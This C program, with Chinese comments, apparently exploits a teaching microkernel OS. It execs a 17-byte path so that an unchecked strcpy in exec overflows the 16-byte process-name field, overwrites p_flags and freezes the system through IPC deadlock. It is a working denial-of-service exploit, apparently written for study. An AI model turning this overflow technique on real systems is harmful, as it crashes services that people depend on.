#include "stdio.h"
#include "string.h"

int main(int argc, char *argv[])
{
    /* 
       漏洞：strcpy(proc_table[src].name, pathname);
       pathname 来自用户传递给 exec 的参数。
       proc_table 的 name 字段长度为 16 字节。
       文件系统文件名最大长度为 12 字节 (MAX_FILENAME_LEN)。
       strip_path 函数会截断过长的文件名，但不会报错。
       因此我们可以传递一个超长的路径名，前 12 字节匹配一个存在的文件，
       从而通过文件检查，但 exec 会把超长的路径名复制到进程表中导致溢出。
    */
    
    printf("Exploit: Buffer Overflow in Process Name\n");
    
    /* 1. 创建一个名字长度为 12 字节的文件 (longname.run) */
    /* 我们将 'echo' 复制一份 */
    char *victim = "longname.run"; // 12 字节
    
    int fd_src = open("echo", O_RDWR);
    if (fd_src == -1) {
        printf("Failed to open 'echo'.\n");
        return 1;
    }
    
    int fd_dst = open(victim, O_CREAT | O_RDWR);
    if (fd_dst == -1) {
        printf("Failed to create %s\n", victim);
        close(fd_src);
        return 1;
    }
    
    char buf[1024];
    int n;
    while ((n = read(fd_src, buf, 1024)) > 0) {
        write(fd_dst, buf, n);
    }
    
    close(fd_src);
    close(fd_dst);
    printf("Created %s (copy of echo)\n", victim);

    /* 2. 使用溢出的路径名执行 */
    /* 
       【溢出原理】
       我们构造一个长度为 17 字节的路径名：
       "longname.runAAAAA" (12字节文件名 + 5字节填充)
       
       strcpy 会写入 18 个字节（17字符 + 1个\0）。
       前 16 字节填满 proc_table.name 字段。
       第 17、18 字节溢出覆盖到 p_flags 字段。
       
       【为什么会卡死？】
       当进程调用 exec 时，它处于阻塞状态（等待 MM 服务进程回复），此时 p_flags 不为 0（包含 RECEIVING 标志）。
       溢出将 p_flags 覆盖为 0 (RUNNABLE) 或其他值。
       这破坏了微内核 IPC（进程间通信）的状态机：
       1. MM 试图回复该进程时，发现它不再处于 RECEIVING 状态，导致发送失败或死锁。
       2. 该进程的状态与内核记录不一致，导致无法被正确调度或唤醒。
       结果：系统关键服务（MM）或 Shell 进程陷入死锁，表现为终端卡死。
    */

    char exploit_path[100];
    strcpy(exploit_path, victim);
    strcat(exploit_path, "AAAAA"); 
    
    char *args[2];
    args[0] = "Overflow_Crash";
    args[1] = 0;
    
    printf("Attempting to exec %s (len=17)...\n", exploit_path);
    printf("The system WILL freeze immediately due to IPC state corruption.\n");

    execv(exploit_path, args);
    
    printf("Exec failed!\n");
    return 1;
}

